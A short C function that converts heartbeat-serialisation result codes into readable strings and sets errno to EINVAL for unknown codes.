const char *prne_htbt_serrc_tostr (const prne_htbt_ser_rc_t x) {
	switch (x) {
	case PRNE_HTBT_SER_RC_OK: return "ok";
	case PRNE_HTBT_SER_RC_MORE_BUF: return "more buf";
	case PRNE_HTBT_SER_RC_ERRNO: return "errno";
	case PRNE_HTBT_SER_RC_FMT_ERR: return "format error";
	}
	errno = EINVAL;
	return NULL;
}
